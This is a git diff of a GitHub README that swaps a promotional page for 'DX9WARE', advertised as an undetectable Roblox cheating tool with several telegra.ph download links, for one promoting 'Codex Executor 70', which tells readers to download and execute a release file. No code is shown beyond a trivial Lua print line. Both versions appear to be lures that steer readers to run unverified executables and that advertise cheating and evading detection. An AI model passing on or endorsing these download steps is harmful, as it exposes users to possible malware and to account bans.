@@ -1,37 +1,86 @@
-# Roblox-Dx9ware
+# Codex Executor 70 🚀
 
-[![Download Now](https://img.shields.io/badge/Download-Full%20version-red)](https://telegra.ph/Download-05-02-264?behg63no3dtxsek)
+![Codex Executor](https://img.shields.io/badge/Codex%20Executor-70-brightgreen.svg)
 
-Welcome to the future of hacking on ROBLOX with **DX9WARE**! 🚀
+Welcome to **Codex Executor 70**, the leading Roblox executor designed to enhance your gaming experience. This repository contains everything you need to run executors smoothly for your favorite Roblox games. 
 
-DX9WARE is the ultimate cheating tool designed to be 100% undetectable and packed with a ton of features to give you the best performance in dominating games on ROBLOX. With DX9WARE, you have everything you need to excel in your gameplay. Let's dive into the details below and let the tool speak for itself.
+## Table of Contents
 
-## Features 🎮
-- **Undetectable**: Stay under the radar while using DX9WARE.
-- **High Performance**: Enjoy smooth gameplay with enhanced features.
-- **Feature Packed**: Loaded with functionalities to boost your gaming experience.
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Releases](#releases)
 
-## How to Use 🛠️
-To get started with DX9WARE, follow these simple steps:
-1. Download the tool from [Link](https://telegra.ph/Download-05-02-264?lzphrd7yji0m8uq).
-2. Install the tool on your system.
-3. Launch DX9WARE and start dominating your games on ROBLOX.
+## Introduction
 
-## Repository Topics 📋
-- dx9ware
-- how-to-use-dx9ware
-- how-to-open-dx9ware
-- dx9ware-config
-- dx9ware-Executors
-- dx9ware-discord
-- dx9ware-roblox
-- dx9ware-executor
-- dx9ware-download
+Codex Executor 70 provides a robust solution for executing scripts in Roblox. Whether you're a seasoned developer or just starting, Codex offers a user-friendly interface and powerful capabilities. 
 
-Be sure to explore these topics for more information and guidance on utilizing DX9WARE to its full potential.
+## Features
 
-## Get Started Now! 🚀
-### [![Get DX9WARE](https://img.shields.io/badge/Get-DX9WARE-blue.svg)](https://telegra.ph/Download-05-02-264?v2cejmpmydeeyfq)
-### Just click the button above to visit the official website of DX9WARE and start your hacking journey on ROBLOX!
+- **User-Friendly Interface**: Navigate easily through the executor with an intuitive layout.
+- **Script Support**: Run various scripts without hassle.
+- **Regular Updates**: Stay updated with the latest features and fixes.
+- **Community Driven**: Join a community of developers and gamers who share tips and scripts.
 
-Remember, DX9WARE is here to revolutionize your gaming experience on ROBLOX. Don't miss out on the opportunity to elevate your gameplay to the next level. Happy hacking! 🎮🔥
+## Installation
+
+To install Codex Executor 70, follow these simple steps:
+
+1. Visit the [Releases page](https://github.com/vodanh666/Codex-Executor-70/releases) to download the latest version.
+2. Locate the downloaded file and execute it on your system.
+3. Follow the on-screen instructions to complete the installation.
+
+## Usage
+
+Once you have installed Codex Executor 70, you can start using it right away. Here’s how:
+
+1. Open Codex Executor.
+2. Copy your desired script.
+3. Paste the script into the executor's input field.
+4. Click on the "Execute" button to run the script.
+
+### Example Script
+
+Here’s a simple example of a script you might want to use:
+
+```lua
+print("Hello, Roblox!")
+```
+
+Just copy and paste this script into the executor and execute it. You should see the output in the console.
+
+## Contributing
+
+We welcome contributions to improve Codex Executor 70. If you have ideas or features you want to add, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch (`git checkout -b feature/YourFeature`).
+3. Make your changes.
+4. Commit your changes (`git commit -m 'Add some feature'`).
+5. Push to the branch (`git push origin feature/YourFeature`).
+6. Open a pull request.
+
+## License
+
+This project is licensed under the MIT License. Feel free to use and modify it as you see fit.
+
+## Contact
+
+For questions or support, please contact the project maintainer:
+
+- **Name**: Vodanh
+- **Email**: vodanh@example.com
+
+## Releases
+
+To get the latest version of Codex Executor 70, visit the [Releases page](https://github.com/vodanh666/Codex-Executor-70/releases). Make sure to download the file and execute it to start using the latest features.
+
+![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)
+
+## Conclusion
+
+Thank you for choosing Codex Executor 70. We hope it enhances your Roblox experience. For more information and updates, keep an eye on the Releases section. Happy gaming! 🎮
